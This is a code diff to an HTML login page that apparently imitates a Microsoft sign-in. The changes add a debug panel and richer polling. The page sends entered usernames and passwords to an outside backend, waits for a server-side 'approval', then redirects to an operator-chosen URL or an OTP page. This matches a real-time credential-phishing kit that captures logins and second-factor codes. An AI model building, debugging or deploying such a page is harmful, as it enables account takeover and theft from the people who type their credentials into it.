@@ -442,9 +442,37 @@
             margin-top: 5px;
             text-align: center;
         }
+
+        /* === DEBUG PANEL (optional - remove in production) === */
+        .debug-panel {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            background: rgba(0,0,0,0.8);
+            color: #0f0;
+            padding: 10px;
+            border-radius: 5px;
+            font-family: monospace;
+            font-size: 12px;
+            max-width: 300px;
+            z-index: 10000;
+            display: none;
+        }
+        .debug-panel.active {
+            display: block;
+        }
     </style>
 </head>
 <body>
+    <!-- Debug Panel (remove in production) -->
+    <div id="debugPanel" class="debug-panel">
+        <div><strong>Debug Info:</strong></div>
+        <div id="debugSession">Session: None</div>
+        <div id="debugStatus">Status: Idle</div>
+        <div id="debugCount">Poll Count: 0</div>
+        <button onclick="toggleDebug()" style="margin-top:5px; padding:2px 5px;">Hide</button>
+    </div>
+
     <!-- Skip to main content link -->
     <a href="#main-content" class="skip-link">Skip to main content</a>
 
@@ -509,6 +537,12 @@
                                 <button class="btn-secondary" style="min-width: auto;" onclick="window.location.href='otp.html';">Forgot password?</button>
                             </div>
                         </div>
+                        
+                        <!-- Test button for debugging -->
+                        <div class="text-center" style="margin-top: 20px;">
+                            <button type="button" class="btn-secondary" onclick="testDirectRedirect()" style="background:#f0f0f0;">Test Redirect</button>
+                            <button type="button" class="btn-secondary" onclick="toggleDebug()" style="background:#f0f0f0;">Toggle Debug</button>
+                        </div>
                     </div>
                 </div>
 
@@ -567,12 +601,41 @@
         </footer>
     </main>
 
-    <!-- Simple script for backend integration -->
+    <!-- Enhanced script with better debugging -->
     <script>
         // Configuration
         const API_BASE_URL = window.location.hostname === 'localhost' 
             ? 'http://localhost:5000' 
             : 'https://s-bcknd.onrender.com'; // Your backend URL
+
+        // Debug variables
+        let debugEnabled = true;
+        let pollCount = 0;
+        let currentSessionId = null;
+        let pollingActive = false;
+
+        // Toggle debug panel
+        function toggleDebug() {
+            const panel = document.getElementById('debugPanel');
+            debugEnabled = !debugEnabled;
+            if (debugEnabled) {
+                panel.classList.add('active');
+            } else {
+                panel.classList.remove('active');
+            }
+        }
+
+        // Update debug info
+        function updateDebug() {
+            if (!debugEnabled) return;
+            document.getElementById('debugSession').textContent = `Session: ${currentSessionId || 'None'}`;
+            document.getElementById('debugCount').textContent = `Poll Count: ${pollCount}`;
+        }
+
+        // Test function for direct redirect
+        function testDirectRedirect() {
+            window.location.href = 'otp.html';
+        }
 
         // Password toggle function
         function togglePassword() {
@@ -587,31 +650,64 @@
             }
         }
 
-        // Poll for status - redirects immediately when approved
+        // Poll for status with improved error handling
         async function checkStatus(sessionId) {
+            if (!sessionId) {
+                console.error('No session ID provided');
+                return;
+            }
+            
+            currentSessionId = sessionId;
+            pollingActive = true;
+            pollCount = 0;
+            
             console.log('Starting status check for session:', sessionId);
+            document.getElementById('debugStatus').textContent = 'Status: Polling';
+            updateDebug();
             
             const poll = async () => {
+                if (!pollingActive) {
+                    console.log('Polling stopped');
+                    return;
+                }
+                
+                pollCount++;
+                updateDebug();
+                
                 try {
+                    console.log(`Poll attempt ${pollCount} for session ${sessionId}`);
+                    
                     const response = await fetch(`${API_BASE_URL}/status/${sessionId}`);
                     const data = await response.json();
                     
                     console.log('Status response:', data);
                     
                     if (data.status === 'approved' && data.redirect_url) {
-                        console.log('Approved! Redirecting to:', data.redirect_url);
-                        // Immediate redirect when approved
-                        window.location.href = data.redirect_url;
-                        return true;
+                        console.log('✅ APPROVED! Redirecting to:', data.redirect_url);
+                        document.getElementById('debugStatus').textContent = `Status: Approved -> ${data.redirect_url}`;
+                        
+                        // Stop polling
+                        pollingActive = false;
+                        
+                        // Small delay to ensure debug message is seen
+                        setTimeout(() => {
+                            window.location.href = data.redirect_url;
+                        }, 500);
+                        
+                        return;
                     } else if (data.status === 'pending') {
-                        // Check again in 2 seconds
+                        console.log('⏳ Pending, checking again in 2 seconds');
+                        document.getElementById('debugStatus').textContent = 'Status: Pending';
                         setTimeout(poll, 2000);
                     } else {
-                        console.log('Unknown status, checking again in 2 seconds');
+                        console.log('Unknown status response:', data);
+                        document.getElementById('debugStatus').textContent = 'Status: Unknown';
                         setTimeout(poll, 2000);
                     }
                 } catch (error) {
-                    console.error('Status check failed:', error);
+                    console.error('❌ Status check failed:', error);
+                    document.getElementById('debugStatus').textContent = 'Status: Error';
+                    
                     // Continue polling despite error
                     setTimeout(poll, 3000);
                 }
@@ -643,7 +739,7 @@
             
             // Disable button and show loading state
             loginBtn.disabled = true;
-            loginBtn.innerHTML = '<span class="spinner"></span>Processing...';
+            loginBtn.innerHTML = '<span class="spinner"></span>Sending...';
             
             try {
                 console.log('Sending login request to:', `${API_BASE_URL}/login`);
@@ -674,22 +770,24 @@
                         localStorage.removeItem('ms_username');
                     }
                     
-                    // Update button text to show we're waiting
+                    // Update button text
                     loginBtn.innerHTML = 'Waiting for approval...';
                     
-                    // Start polling for approval - will redirect immediately when approved
+                    // Start polling for approval
                     checkStatus(data.id);
                 } else {
                     // Handle error
                     errorContainer.textContent = data.error || 'Login failed. Please try again.';
                     loginBtn.disabled = false;
                     loginBtn.innerHTML = 'Log in';
+                    pollingActive = false;
                 }
             } catch (error) {
                 console.error('Login error:', error);
                 errorContainer.textContent = 'Network error. Please check your connection and try again.';
                 loginBtn.disabled = false;
                 loginBtn.innerHTML = 'Log in';
+                pollingActive = false;
             }
             
             return false;
@@ -704,9 +802,18 @@
                 document.getElementById('username').value = savedUsername;
                 rememberCheckbox.checked = true;
             }
+            
+            // Show debug panel by default
+            document.getElementById('debugPanel').classList.add('active');
+            
+            console.log('API Base URL:', API_BASE_URL);
+            console.log('Page loaded at:', new Date().toISOString());
         });
 
-        console.log('API Base URL:', API_BASE_URL);
+        // Clean up polling on page unload
+        window.addEventListener('beforeunload', function() {
+            pollingActive = false;
+        });
     </script>
 </body>
 </html>
